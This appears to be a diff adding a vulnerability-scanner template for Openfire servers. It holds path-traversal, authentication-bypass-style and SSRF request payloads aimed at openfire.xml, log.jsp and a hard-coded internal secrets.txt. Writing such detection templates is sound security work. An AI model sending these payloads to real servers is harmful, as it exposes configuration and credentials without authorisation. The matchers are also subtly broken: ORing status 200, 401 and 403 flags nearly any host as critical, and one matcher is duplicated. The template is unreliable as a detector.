@@ -1,0 +1,46 @@
+id: openfire-misconfig
+info:
+  name: Openfire Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Openfire instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to configuration exposure.
+  tags: openfire, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/getFavicon?host=192.168.176.1:8080/secrets.txt?"
+      - "{{BaseURL}}/plugins/search/..\\..\\..\\conf\\openfire.xml"
+      - "{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
+      - "{{BaseURL}}:9090/getFavicon?host=192.168.176.1:8080/secrets.txt?"
+      - "{{BaseURL}}:9090/plugins/search/..\\..\\..\\conf\\openfire.xml"
+      - "{{BaseURL}}:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Openfire"
+          - "openfire.xml"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Openfire"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
